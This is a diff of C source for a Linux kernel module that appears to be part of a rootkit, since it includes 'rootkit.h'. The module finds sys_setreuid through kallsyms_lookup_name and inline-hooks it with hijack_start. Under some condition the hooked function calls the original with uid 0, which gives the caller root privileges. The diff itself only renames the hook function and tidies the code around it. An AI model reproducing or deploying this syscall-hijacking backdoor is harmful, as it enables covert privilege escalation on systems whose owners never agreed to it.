@@ -10,10 +10,9 @@
 #include <linux/kallsyms.h>
 #include <asm/cacheflush.h>
 #include <asm/page.h>
-#include "hook.c"
+#include "rootkit.h"
 
 
-unsigned long *syscall_table;
 unsigned char* original_code;
 typedef asmlinkage long (* original_setreuid_t)(old_uid_t ruid, old_uid_t euid);
 
@@ -22,7 +21,7 @@ typedef unsigned long psize;
 psize *o_sys_setreuid;
 
 
-asmlinkage long my_sys_setreuid(old_uid_t ruid, old_uid_t euid) {
+asmlinkage long my_sys_setreuid_inline(old_uid_t ruid, old_uid_t euid) {
 	int result = 0;
 
 	original_setreuid_t original_setreuid = (original_setreuid_t) o_sys_setreuid; 
@@ -54,8 +53,8 @@ asmlinkage long my_sys_setreuid(old_uid_t ruid, old_uid_t euid) {
 
 		result = original_setreuid(0, 0);
 
-		printk("inserting hook - %p %p \n", o_sys_setreuid, my_sys_setreuid);
-    	hijack_start(o_sys_setreuid, my_sys_setreuid, &original_code);
+		printk("inserting hook - %p %p \n", o_sys_setreuid, my_sys_setreuid_inline);
+    	hijack_start(o_sys_setreuid, my_sys_setreuid_inline, &original_code);
 
     	return result;
 
@@ -66,7 +65,7 @@ asmlinkage long my_sys_setreuid(old_uid_t ruid, old_uid_t euid) {
 	result = original_setreuid(ruid, euid);		
 
 	printk("inserting hook");
-	hijack_start(o_sys_setreuid, my_sys_setreuid, &original_code);
+	hijack_start(o_sys_setreuid, my_sys_setreuid_inline, &original_code);
 
 
 	return result;
@@ -75,12 +74,11 @@ asmlinkage long my_sys_setreuid(old_uid_t ruid, old_uid_t euid) {
 
 
 void start_root_hook_inline(void) {
-	printk("%i", __NR_setreuid32); 
 	
 	o_sys_setreuid = (unsigned long *) kallsyms_lookup_name("sys_setreuid");
 
 	printk("setruid - %p \n", o_sys_setreuid);
-    hijack_start(o_sys_setreuid, my_sys_setreuid, &original_code);
+    hijack_start(o_sys_setreuid, my_sys_setreuid_inline, &original_code);
 
 }
 
